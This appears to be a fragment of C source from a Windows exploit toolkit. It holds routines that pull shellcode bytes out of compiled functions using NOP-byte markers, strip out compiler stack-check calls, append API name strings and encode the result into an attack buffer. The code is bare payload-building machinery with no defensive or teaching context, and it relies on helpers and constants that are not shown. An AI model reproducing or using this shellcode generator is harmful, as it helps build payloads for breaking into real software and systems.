


int  GetFindShellcode(char *buffer)
{

  char    *fnendstr="\x90\x90\x90\x90\x90\x90\x90\x90\x90";
  char    *shellcodefnadd,*chkespadd;
  char    shellcodebuff[BUFFSIZE];
  int     i,j,k;
 
  shellcodefnadd=getfnaddress(shellcodefnlock);
  
  for(k=0;k<=BUFFSIZE;++k){
		 if(memcmp(shellcodefnadd+k,fnendstr,FNENDLONG)==0) break;
  }
  for(i=0;i<=BUFFSIZE;++i){
		 if(memcmp(shellcodefnadd+k+FNENDLONG+i,fnendstr,FNENDLONG)==0) break;
  }
  memcpy(buffer,shellcodefnadd+k+FNENDLONG,i);

  shellcodefnadd=getfnaddress(findshellcodefn);

  for(k=0;k<=BUFFSIZE;++k){
		 if(memcmp(shellcodefnadd+k,fnendstr,FNENDLONG)==0) break;
  }

  memcpy(shellcodebuff,shellcodefnadd,k); 

  _asm{
		 mov ESI,ESP
		 cmp ESI,ESP
  }
  _chkesp();
  chkespadd=getfnaddress(_chkesp);
  
  cleanchkesp(shellcodefnadd,shellcodebuff,chkespadd,k);
  k=codeshell(buffer+i,BUFFSIZE-i,shellcodebuff,k);
  i=i+k;

  return i;
}



int  GetShellcode(char *buffer)
{

  char    *fnendstr="\x90\x90\x90\x90\x90\x90\x90\x90\x90";
  char    *shellcodefnadd,*chkespadd;
  char    shellcodebuff[BUFFSIZE];
  int     i,j,k;
 
  shellcodefnadd=getfnaddress(shellcodefnlock);
  
  for(k=0;k<=BUFFSIZE;++k){
		 if(memcmp(shellcodefnadd+k,fnendstr,FNENDLONG)==0) break;
  }
  for(i=0;i<=BUFFSIZE;++i){
		 if(memcmp(shellcodefnadd+k+FNENDLONG+i,fnendstr,FNENDLONG)==0) break;
  }
  memcpy(buffer,shellcodefnadd+k+FNENDLONG,i);

  shellcodefnadd=getfnaddress(shellcodefn);

  for(k=0;k<=BUFFSIZE;++k){
		 if(memcmp(shellcodefnadd+k,fnendstr,FNENDLONG)==0) break;
  }

  memcpy(shellcodebuff,shellcodefnadd,k); 

  _asm{
		 mov ESI,ESP
		 cmp ESI,ESP
  }
  _chkesp();
  chkespadd=getfnaddress(_chkesp);
  
  cleanchkesp(shellcodefnadd,shellcodebuff,chkespadd,k);
  j=getapistr(shellcodebuff+k);
  k=k+j;
  k=codeshell(buffer+i,BUFFSIZE-i,shellcodebuff,k);
  i=i+k;

  return i;
}




void cleanchkesp(char *fnadd,char *shellbuff,char *chkesp,int len)
{ 
   int i,k;
   unsigned char temp;
   char *calladd;

   for(i=0;i<len;++i)
   {
	   temp=shellbuff[i];
       if(temp==0xe8)
	   {
         k=*(int *)(shellbuff+i+1);
		 calladd=fnadd;
		 calladd+=k;
		 calladd+=i;
		 calladd+=5;
		 if(calladd==chkesp)
		 {
			 shellbuff[i]=0x90;
			 shellbuff[i+1]=0x43;   // inc ebx
		     shellbuff[i+2]=0x4b;	// dec ebx
			 shellbuff[i+3]=0x43;
			 shellbuff[i+4]=0x4b;
		 }
	   }
   }
}


char *getfnaddress(char *fn)
{
	unsigned char temp;
    temp=*fn;
    if(temp==0xe9)
	{
		 fn+=*(int*)(fn+1);
		 fn+=5;
	}
	return(fn);
}
 	
